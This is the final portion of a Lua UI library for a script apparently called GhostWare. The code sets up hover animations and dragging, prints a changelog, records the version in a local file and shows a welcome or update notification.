					tweenservice:Create(v, info2, hover):Play()
				end)
				v.MouseLeave:Connect(function()
					tweenservice:Create(v, info2, unselected):Play()
				end)
			end
		end
	end
	coroutine.wrap(Hover)()

	if not draggable then 
		draggable = false
	elseif draggable == true then
		coroutine.wrap(DragScript)()
	end
  
	print("[GHOSTWARE] Running version " .. ver .. "! Changelog:\n" .. changelog)
	
        if isfile('GhostwareVer.txt') then
		if readfile('GhostwareVer.txt') == ver then
		else
			print(changelog)
			writefile('GhostwareVer.txt', ver)
			WindowLib.notification("GhostWare | New Version", changelog)
		end
	else
		writefile('GhostwareVer.txt', ver)
		WindowLib.notification("GhostWare | Welcome", "This seems to be your first time using GhostWare! Thank you for purchasing GhostWare. If you encounter any issues please report it in the Discord.")
	end
	
	return WindowLib
end

return lib
